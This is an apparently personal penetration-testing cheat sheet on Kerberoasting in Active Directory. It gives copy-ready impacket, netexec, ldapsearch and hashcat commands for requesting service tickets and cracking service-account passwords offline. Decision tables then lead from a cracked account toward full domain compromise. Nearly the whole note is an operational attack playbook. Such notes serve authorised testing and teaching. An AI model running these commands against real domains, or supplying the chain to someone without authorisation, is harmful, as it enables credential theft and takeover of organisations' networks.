# 🏰 Kerberoasting

> Any authenticated domain user can request a service ticket (TGS) for any account with an **SPN** — the ticket is encrypted with the **service account's password hash**, crackable offline. Service accounts are often over-privileged and weakly passworded → a common path to Domain Admin.

Part of [[Active Directory]]. Related: [[AD Enumeration]] · [[Kerberos]] · [[Hash Cracking]] · [[AS-REP Roasting]]

---

## 🧠 THINK
- **Needs one valid domain credential** (unlike [[AS-REP Roasting]]).
- Targets accounts with a **`servicePrincipalName`** set.
- Output is `$krb5tgs$` → crack with hashcat **-m 13100**.
- A roasted account that's a Domain Admin (or has a strong ACL) = huge win.

## ⚡ RUN
Request all SPN tickets:
```bash
impacket-GetUserSPNs $DOMAIN/$U:$P -dc-ip $DC -request -outputfile kerb.txt
```
Via netexec:
```bash
netexec ldap $DC -u $U -p $P --kerberoasting kerb.txt
```
List roastable accounts first (LDAP):
```bash
ldapsearch -x -H ldap://$DC -b "DC=corp,DC=local" "(servicePrincipalName=*)" sAMAccountName servicePrincipalName
```
**Look for:** `$krb5tgs$23$*user$DOMAIN...`; note which accounts look privileged (SQL/admin/svc\_).

## 💥 CRACK
```bash
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
```
Cracked service cred → check its privileges (BloodHound) → [[AD Lateral Movement]] / [[AD ACL Abuse]] / possibly DA → [[DCSync & Domain Dominance]].

## 🔁 FOUND → NEXT
| FINDING | NEXT |
|---|---|
| `$krb5tgs$` hash | `hashcat -m 13100` → service password |
| Cracked svc = DA/admin | psexec/evil-winrm → domain compromise |
| Cracked svc = normal user | reuse + re-Kerberoast + BloodHound |
| Account is privileged (BH) | target it specifically |

## 🚧 FAILED → NEXT
| Problem | Do this |
|---|---|
| No SPNs | fall back to [[AS-REP Roasting]], [[AD ACL Abuse]], or local privesc on foothold → new creds |
| Skew error | `sudo ntpdate $DC` |
| Hash won't crack | rules/bigger lists; move to BloodHound ACL paths |
| Cred rejected requesting TGS | verify domain FQDN/format → [[Credentials Rejected]] |

## 📇 CHEAT SHEET
```bash
impacket-GetUserSPNs $DOMAIN/$U:$P -dc-ip $DC -request -o kerb.txt
```
```bash
hashcat -m 13100 kerb.txt rockyou.txt
```
**Kill shot:** 1 cred → Kerberoast SPN accounts → crack → often DA.
